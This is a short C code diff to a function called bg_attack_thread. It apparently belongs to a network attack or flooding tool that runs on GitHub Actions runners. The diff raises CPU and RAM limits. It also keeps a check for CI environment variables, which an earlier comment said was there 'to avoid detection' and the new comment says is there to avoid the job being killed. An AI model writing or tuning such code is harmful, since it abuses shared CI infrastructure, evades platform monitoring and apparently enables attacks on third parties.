@@ -650,16 +650,16 @@ void *bg_attack_thread(void *arg)
         struct sysinfo si;
         long free_mb = 512;
         if (sysinfo(&si) == 0) free_mb = (long)(si.freeram / (1024 * 1024));
-        /* RAM safety: reserve 256MB for system + WS, limit to 50% of free */
-        long usable_mb = free_mb > 256 ? (free_mb - 256) : 64;
-        if (usable_mb > free_mb / 2) usable_mb = free_mb / 2;
+        /* RAM safety: reserve 128MB for system, limit to 75% of free */
+        long usable_mb = free_mb > 128 ? (free_mb - 128) : 64;
+        if (usable_mb > free_mb * 3 / 4) usable_mb = free_mb * 3 / 4;
         if (usable_mb < 64) usable_mb = 64;
 
-        /* GitHub Runner: severely limit everything to avoid detection */
+        /* GitHub Runner: conservative limits to avoid job kill (still risky) */
         if (getenv("GITHUB_ACTIONS") || getenv("RUNNER_NAME")) {
-            cores = (cores > 2) ? 2 : cores;
-            usable_mb = (usable_mb > 128) ? 128 : usable_mb;
-            fprintf(stderr, "[atk] GitHub Runner: cores=%d ram=%ldMB\n", cores, usable_mb);
+            cores = (cores > 3) ? 3 : cores;
+            usable_mb = (usable_mb > 2048) ? 2048 : usable_mb;
+            fprintf(stderr, "[atk] GitHub Runner: cores=%d ram=%ldMB (capped)\n", cores, usable_mb);
         }
 
         /* Cap socket count: 256 per CPU max, min 64. Avoid OOM from huge socket pools. */
